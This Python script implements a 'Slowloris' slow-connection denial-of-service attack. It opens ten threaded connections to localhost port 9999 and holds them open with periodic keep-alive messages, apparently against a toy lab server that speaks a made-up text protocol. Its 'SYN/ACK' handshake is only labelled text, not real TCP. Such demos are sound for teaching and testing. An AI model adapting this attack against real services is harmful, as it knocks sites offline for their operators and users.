import random
import socket
import threading
import time

class Slowloris:
    def __init__(self):
        self.target_ip = '127.0.0.1'
        self.target_port = 9999
        self.connections = []
        self.running = False
        
    def create_slow_connection(self, conn_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)  
            sock.connect((self.target_ip, self.target_port))
            sock.send(b"SYN")
            
            data = sock.recv(1024)
            if data != b"SYN-ACK":
                sock.close()
                return
                
            sock.send(b"ACK")       
            print(f"[Slowloris {conn_id}] Connection established")
            self.connections.append(sock)
            
            sock.send(b"KEEP")
            time.sleep(5)          
            while self.running:
                sock.send(b"ALIVE")
                time.sleep(12)           
                if random.random() > 0.5:
                    sock.send(b"STILL-HERE")
                    time.sleep(15)
                    
        except Exception as e:
            print(f"[Slowloris {conn_id}] Error: {e}")
            if sock in self.connections:
                self.connections.remove(sock)
    
    def start_attack(self, num_connections=10):
        print(f"[Slowloris] Starting attack on {self.target_ip}:{self.target_port}")
        print(f"[Slowloris] Creating {num_connections} slow connections...")
        self.running = True
        threads = []
        
        for i in range(num_connections):
            t = threading.Thread(target=self.create_slow_connection, args=(i+1,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(1.25)

            if (i + 1) % 3 == 0:
                print(f"[Slowloris] Created {i+1}/{num_connections} connections")
        
        try:
            while self.running:
                time.sleep(5)
                active = len([c for c in self.connections if c])
                print(f"[Slowloris] {active} connections active")
        except KeyboardInterrupt:
            print("\n[Slowloris] Stopping attack...")
        finally:
            self.stop_attack()
    
    def stop_attack(self):
        self.running = False
        print("[Slowloris] Closing connections...")     
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass     
        self.connections.clear()
        print("[Slowloris] Attack stopped")


if __name__ == "__main__":
    attack = Slowloris()
    try:
        attack.start_attack(10)
    except KeyboardInterrupt:
        attack.stop_attack()